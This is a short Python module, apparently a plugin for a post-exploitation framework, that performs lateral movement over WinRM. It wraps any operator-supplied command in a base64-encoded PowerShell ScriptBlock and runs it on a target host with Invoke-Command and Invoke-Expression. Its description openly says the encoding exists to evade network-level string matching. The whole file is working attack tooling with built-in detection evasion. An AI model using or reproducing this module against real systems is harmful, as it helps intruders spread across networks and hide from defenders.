MODULE_INFO = {
    "name": "lat_winrm",
    "description": "Lateral movement via WinRM (PowerShell Remoting). Uses encoded ScriptBlocks to evade network-level string matching.",
    "platform": "windows"
}

def run(session, args):
    if len(args) < 2:
        return "[!] Usage: use lat_winrm <target_ip> <command_to_execute>"
    
    target = args[0]
    cmd_exec = " ".join(args[1:])
    escaped_cmd = cmd_exec.replace("'", "''")
    
    cmd = f"""
$target = "{target}"
$cmdScript = '{escaped_cmd}'
Write-Output "[*] Encoding payload for WinRM execution..."

$payloadBytes = [Text.Encoding]::Unicode.GetBytes($cmdScript)
$enc = [Convert]::ToBase64String($payloadBytes)

Write-Output "[*] Executing command on $target via WinRM"

try {{
    $SB = {{
        $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($using:enc))
        Invoke-Expression $decoded
    }}
    Invoke-Command -ComputerName $target -ScriptBlock $SB | Out-String
    Write-Output "[+] Command dispatched successfully!"
}} catch {{
    Write-Output "[!] WinRM failed: $($_.Exception.Message)"
}}
"""
    return cmd
